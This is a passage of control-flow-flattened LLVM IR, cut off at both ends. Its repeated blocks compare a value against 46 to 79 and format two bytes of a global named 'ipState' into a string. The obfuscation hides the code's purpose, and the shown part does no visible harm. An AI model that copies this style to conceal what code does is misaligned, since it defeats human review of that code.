  %529 = zext i8 %528 to i32
  %530 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %531 = zext i8 %530 to i32
  %532 = call i32 (i8*, i8*, ...) @szprintf(i8* %527, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.87, i32 0, i32 0), i32 %529, i32 %531)
  store i32 1778404666, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = load i32, i32* %1, align 4
  %535 = icmp eq i32 %534, 46
  %536 = select i1 %535, i32 -1109778750, i32 576312287
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %539 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %540 = zext i8 %539 to i32
  %541 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %542 = zext i8 %541 to i32
  %543 = call i32 (i8*, i8*, ...) @szprintf(i8* %538, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i32 %540, i32 %542)
  store i32 576312287, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %1, align 4
  %546 = icmp eq i32 %545, 47
  %547 = select i1 %546, i32 1399910188, i32 -370495099
  store i32 %547, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %550 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %551 = zext i8 %550 to i32
  %552 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %553 = zext i8 %552 to i32
  %554 = call i32 (i8*, i8*, ...) @szprintf(i8* %549, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.89, i32 0, i32 0), i32 %551, i32 %553)
  store i32 -370495099, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i32, i32* %1, align 4
  %557 = icmp eq i32 %556, 48
  %558 = select i1 %557, i32 -227790338, i32 862080555
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %561 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %562 = zext i8 %561 to i32
  %563 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %564 = zext i8 %563 to i32
  %565 = call i32 (i8*, i8*, ...) @szprintf(i8* %560, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.90, i32 0, i32 0), i32 %562, i32 %564)
  store i32 862080555, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load i32, i32* %1, align 4
  %568 = icmp eq i32 %567, 49
  %569 = select i1 %568, i32 -848055595, i32 -594141330
  store i32 %569, i32* %switchVar
  br label %loopEnd

; <label>:570:                                    ; preds = %loopEntry
  %571 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %572 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %573 = zext i8 %572 to i32
  %574 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %575 = zext i8 %574 to i32
  %576 = call i32 (i8*, i8*, ...) @szprintf(i8* %571, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i32 %573, i32 %575)
  store i32 -594141330, i32* %switchVar
  br label %loopEnd

; <label>:577:                                    ; preds = %loopEntry
  %578 = load i32, i32* %1, align 4
  %579 = icmp eq i32 %578, 50
  %580 = select i1 %579, i32 163446352, i32 156995407
  store i32 %580, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %583 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %584 = zext i8 %583 to i32
  %585 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %586 = zext i8 %585 to i32
  %587 = call i32 (i8*, i8*, ...) @szprintf(i8* %582, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0), i32 %584, i32 %586)
  store i32 156995407, i32* %switchVar
  br label %loopEnd

; <label>:588:                                    ; preds = %loopEntry
  %589 = load i32, i32* %1, align 4
  %590 = icmp eq i32 %589, 51
  %591 = select i1 %590, i32 1197097519, i32 -423961556
  store i32 %591, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %594 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %595 = zext i8 %594 to i32
  %596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %597 = zext i8 %596 to i32
  %598 = call i32 (i8*, i8*, ...) @szprintf(i8* %593, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.93, i32 0, i32 0), i32 %595, i32 %597)
  store i32 -423961556, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i32, i32* %1, align 4
  %601 = icmp eq i32 %600, 52
  %602 = select i1 %601, i32 -777078577, i32 1110982188
  store i32 %602, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  %604 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %605 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %606 = zext i8 %605 to i32
  %607 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %608 = zext i8 %607 to i32
  %609 = call i32 (i8*, i8*, ...) @szprintf(i8* %604, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.94, i32 0, i32 0), i32 %606, i32 %608)
  store i32 1110982188, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load i32, i32* %1, align 4
  %612 = icmp eq i32 %611, 53
  %613 = select i1 %612, i32 1659430705, i32 267897640
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %616 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %617 = zext i8 %616 to i32
  %618 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %619 = zext i8 %618 to i32
  %620 = call i32 (i8*, i8*, ...) @szprintf(i8* %615, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.95, i32 0, i32 0), i32 %617, i32 %619)
  store i32 267897640, i32* %switchVar
  br label %loopEnd

; <label>:621:                                    ; preds = %loopEntry
  %622 = load i32, i32* %1, align 4
  %623 = icmp eq i32 %622, 54
  %624 = select i1 %623, i32 1577857465, i32 2013178534
  store i32 %624, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %627 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %628 = zext i8 %627 to i32
  %629 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %630 = zext i8 %629 to i32
  %631 = call i32 (i8*, i8*, ...) @szprintf(i8* %626, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.96, i32 0, i32 0), i32 %628, i32 %630)
  store i32 2013178534, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  %633 = load i32, i32* %1, align 4
  %634 = icmp eq i32 %633, 55
  %635 = select i1 %634, i32 -2112138654, i32 -1544237705
  store i32 %635, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  %637 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %638 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %639 = zext i8 %638 to i32
  %640 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %641 = zext i8 %640 to i32
  %642 = call i32 (i8*, i8*, ...) @szprintf(i8* %637, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.97, i32 0, i32 0), i32 %639, i32 %641)
  store i32 -1544237705, i32* %switchVar
  br label %loopEnd

; <label>:643:                                    ; preds = %loopEntry
  %644 = load i32, i32* %1, align 4
  %645 = icmp eq i32 %644, 56
  %646 = select i1 %645, i32 -1165390008, i32 1086449189
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  %648 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %649 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %650 = zext i8 %649 to i32
  %651 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %652 = zext i8 %651 to i32
  %653 = call i32 (i8*, i8*, ...) @szprintf(i8* %648, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.98, i32 0, i32 0), i32 %650, i32 %652)
  store i32 1086449189, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i32, i32* %1, align 4
  %656 = icmp eq i32 %655, 57
  %657 = select i1 %656, i32 2137856409, i32 -1453623883
  store i32 %657, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %660 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %661 = zext i8 %660 to i32
  %662 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %663 = zext i8 %662 to i32
  %664 = call i32 (i8*, i8*, ...) @szprintf(i8* %659, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.99, i32 0, i32 0), i32 %661, i32 %663)
  store i32 -1453623883, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %1, align 4
  %667 = icmp eq i32 %666, 58
  %668 = select i1 %667, i32 1847208648, i32 -438181337
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %671 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %672 = zext i8 %671 to i32
  %673 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %674 = zext i8 %673 to i32
  %675 = call i32 (i8*, i8*, ...) @szprintf(i8* %670, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.100, i32 0, i32 0), i32 %672, i32 %674)
  store i32 -438181337, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = load i32, i32* %1, align 4
  %678 = icmp eq i32 %677, 59
  %679 = select i1 %678, i32 -1851401784, i32 -1222432460
  store i32 %679, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %682 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %683 = zext i8 %682 to i32
  %684 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %685 = zext i8 %684 to i32
  %686 = call i32 (i8*, i8*, ...) @szprintf(i8* %681, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.101, i32 0, i32 0), i32 %683, i32 %685)
  store i32 -1222432460, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %1, align 4
  %689 = icmp eq i32 %688, 60
  %690 = select i1 %689, i32 -1391277074, i32 -652346633
  store i32 %690, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %693 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %694 = zext i8 %693 to i32
  %695 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %696 = zext i8 %695 to i32
  %697 = call i32 (i8*, i8*, ...) @szprintf(i8* %692, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.102, i32 0, i32 0), i32 %694, i32 %696)
  store i32 -652346633, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i32, i32* %1, align 4
  %700 = icmp eq i32 %699, 61
  %701 = select i1 %700, i32 -383790656, i32 107917869
  store i32 %701, i32* %switchVar
  br label %loopEnd

; <label>:702:                                    ; preds = %loopEntry
  %703 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %704 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %705 = zext i8 %704 to i32
  %706 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %707 = zext i8 %706 to i32
  %708 = call i32 (i8*, i8*, ...) @szprintf(i8* %703, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.103, i32 0, i32 0), i32 %705, i32 %707)
  store i32 107917869, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32, i32* %1, align 4
  %711 = icmp eq i32 %710, 62
  %712 = select i1 %711, i32 -701844831, i32 115726441
  store i32 %712, i32* %switchVar
  br label %loopEnd

; <label>:713:                                    ; preds = %loopEntry
  %714 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %715 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %716 = zext i8 %715 to i32
  %717 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %718 = zext i8 %717 to i32
  %719 = call i32 (i8*, i8*, ...) @szprintf(i8* %714, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.104, i32 0, i32 0), i32 %716, i32 %718)
  store i32 115726441, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %1, align 4
  %722 = icmp eq i32 %721, 63
  %723 = select i1 %722, i32 1061652470, i32 -2031326778
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %726 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %727 = zext i8 %726 to i32
  %728 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %729 = zext i8 %728 to i32
  %730 = call i32 (i8*, i8*, ...) @szprintf(i8* %725, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.105, i32 0, i32 0), i32 %727, i32 %729)
  store i32 -2031326778, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  %732 = load i32, i32* %1, align 4
  %733 = icmp eq i32 %732, 64
  %734 = select i1 %733, i32 498257638, i32 -949209999
  store i32 %734, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  %736 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %737 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %738 = zext i8 %737 to i32
  %739 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %740 = zext i8 %739 to i32
  %741 = call i32 (i8*, i8*, ...) @szprintf(i8* %736, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0), i32 %738, i32 %740)
  store i32 -949209999, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  %743 = load i32, i32* %1, align 4
  %744 = icmp eq i32 %743, 65
  %745 = select i1 %744, i32 2117994951, i32 -1319899888
  store i32 %745, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
  %747 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %748 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %749 = zext i8 %748 to i32
  %750 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %751 = zext i8 %750 to i32
  %752 = call i32 (i8*, i8*, ...) @szprintf(i8* %747, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i32 %749, i32 %751)
  store i32 -1319899888, i32* %switchVar
  br label %loopEnd

; <label>:753:                                    ; preds = %loopEntry
  %754 = load i32, i32* %1, align 4
  %755 = icmp eq i32 %754, 66
  %756 = select i1 %755, i32 -1229732709, i32 433154673
  store i32 %756, i32* %switchVar
  br label %loopEnd

; <label>:757:                                    ; preds = %loopEntry
  %758 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %759 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %760 = zext i8 %759 to i32
  %761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %762 = zext i8 %761 to i32
  %763 = call i32 (i8*, i8*, ...) @szprintf(i8* %758, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i32 %760, i32 %762)
  store i32 433154673, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i32, i32* %1, align 4
  %766 = icmp eq i32 %765, 67
  %767 = select i1 %766, i32 2037564557, i32 895991108
  store i32 %767, i32* %switchVar
  br label %loopEnd

; <label>:768:                                    ; preds = %loopEntry
  %769 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %770 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %771 = zext i8 %770 to i32
  %772 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %773 = zext i8 %772 to i32
  %774 = call i32 (i8*, i8*, ...) @szprintf(i8* %769, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.109, i32 0, i32 0), i32 %771, i32 %773)
  store i32 895991108, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = load i32, i32* %1, align 4
  %777 = icmp eq i32 %776, 68
  %778 = select i1 %777, i32 -1175213858, i32 -666900308
  store i32 %778, i32* %switchVar
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  %780 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %782 = zext i8 %781 to i32
  %783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %784 = zext i8 %783 to i32
  %785 = call i32 (i8*, i8*, ...) @szprintf(i8* %780, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.110, i32 0, i32 0), i32 %782, i32 %784)
  store i32 -666900308, i32* %switchVar
  br label %loopEnd

; <label>:786:                                    ; preds = %loopEntry
  %787 = load i32, i32* %1, align 4
  %788 = icmp eq i32 %787, 69
  %789 = select i1 %788, i32 2095816786, i32 1877371147
  store i32 %789, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %792 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %793 = zext i8 %792 to i32
  %794 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %795 = zext i8 %794 to i32
  %796 = call i32 (i8*, i8*, ...) @szprintf(i8* %791, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.111, i32 0, i32 0), i32 %793, i32 %795)
  store i32 1877371147, i32* %switchVar
  br label %loopEnd

; <label>:797:                                    ; preds = %loopEntry
  %798 = load i32, i32* %1, align 4
  %799 = icmp eq i32 %798, 70
  %800 = select i1 %799, i32 -1375240177, i32 -1299874840
  store i32 %800, i32* %switchVar
  br label %loopEnd

; <label>:801:                                    ; preds = %loopEntry
  %802 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %803 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %804 = zext i8 %803 to i32
  %805 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %806 = zext i8 %805 to i32
  %807 = call i32 (i8*, i8*, ...) @szprintf(i8* %802, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.112, i32 0, i32 0), i32 %804, i32 %806)
  store i32 -1299874840, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i32, i32* %1, align 4
  %810 = icmp eq i32 %809, 71
  %811 = select i1 %810, i32 1150416796, i32 -1355717819
  store i32 %811, i32* %switchVar
  br label %loopEnd

; <label>:812:                                    ; preds = %loopEntry
  %813 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %814 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %815 = zext i8 %814 to i32
  %816 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %817 = zext i8 %816 to i32
  %818 = call i32 (i8*, i8*, ...) @szprintf(i8* %813, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %815, i32 %817)
  store i32 -1355717819, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i32, i32* %1, align 4
  %821 = icmp eq i32 %820, 72
  %822 = select i1 %821, i32 982015020, i32 305953617
  store i32 %822, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %825 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %826 = zext i8 %825 to i32
  %827 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %828 = zext i8 %827 to i32
  %829 = call i32 (i8*, i8*, ...) @szprintf(i8* %824, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i32 %826, i32 %828)
  store i32 305953617, i32* %switchVar
  br label %loopEnd

; <label>:830:                                    ; preds = %loopEntry
  %831 = load i32, i32* %1, align 4
  %832 = icmp eq i32 %831, 73
  %833 = select i1 %832, i32 -1656666539, i32 2037963687
  store i32 %833, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %836 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %837 = zext i8 %836 to i32
  %838 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %839 = zext i8 %838 to i32
  %840 = call i32 (i8*, i8*, ...) @szprintf(i8* %835, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %837, i32 %839)
  store i32 2037963687, i32* %switchVar
  br label %loopEnd

; <label>:841:                                    ; preds = %loopEntry
  %842 = load i32, i32* %1, align 4
  %843 = icmp eq i32 %842, 74
  %844 = select i1 %843, i32 -1231934440, i32 -514597603
  store i32 %844, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %847 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %848 = zext i8 %847 to i32
  %849 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %850 = zext i8 %849 to i32
  %851 = call i32 (i8*, i8*, ...) @szprintf(i8* %846, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i32 %848, i32 %850)
  store i32 -514597603, i32* %switchVar
  br label %loopEnd

; <label>:852:                                    ; preds = %loopEntry
  %853 = load i32, i32* %1, align 4
  %854 = icmp eq i32 %853, 75
  %855 = select i1 %854, i32 298156738, i32 56830307
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %858 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %859 = zext i8 %858 to i32
  %860 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %861 = zext i8 %860 to i32
  %862 = call i32 (i8*, i8*, ...) @szprintf(i8* %857, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.115, i32 0, i32 0), i32 %859, i32 %861)
  store i32 56830307, i32* %switchVar
  br label %loopEnd

; <label>:863:                                    ; preds = %loopEntry
  %864 = load i32, i32* %1, align 4
  %865 = icmp eq i32 %864, 76
  %866 = select i1 %865, i32 -435147411, i32 -999357376
  store i32 %866, i32* %switchVar
  br label %loopEnd

; <label>:867:                                    ; preds = %loopEntry
  %868 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %869 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %870 = zext i8 %869 to i32
  %871 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %872 = zext i8 %871 to i32
  %873 = call i32 (i8*, i8*, ...) @szprintf(i8* %868, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i32 0, i32 0), i32 %870, i32 %872)
  store i32 -999357376, i32* %switchVar
  br label %loopEnd

; <label>:874:                                    ; preds = %loopEntry
  %875 = load i32, i32* %1, align 4
  %876 = icmp eq i32 %875, 77
  %877 = select i1 %876, i32 -102960119, i32 1663612819
  store i32 %877, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %880 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %881 = zext i8 %880 to i32
  %882 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %883 = zext i8 %882 to i32
  %884 = call i32 (i8*, i8*, ...) @szprintf(i8* %879, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.117, i32 0, i32 0), i32 %881, i32 %883)
  store i32 1663612819, i32* %switchVar
  br label %loopEnd

; <label>:885:                                    ; preds = %loopEntry
  %886 = load i32, i32* %1, align 4
  %887 = icmp eq i32 %886, 78
  %888 = select i1 %887, i32 -1920852666, i32 1343778636
  store i32 %888, i32* %switchVar
  br label %loopEnd

; <label>:889:                                    ; preds = %loopEntry
  %890 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %892 = zext i8 %891 to i32
  %893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %894 = zext i8 %893 to i32
  %895 = call i32 (i8*, i8*, ...) @szprintf(i8* %890, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0), i32 %892, i32 %894)
  store i32 1343778636, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  %897 = load i32, i32* %1, align 4
  %898 = icmp eq i32 %897, 79
  %899 = select i1 %898, i32 1439141315, i32 -1460997941
  store i32 %899, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
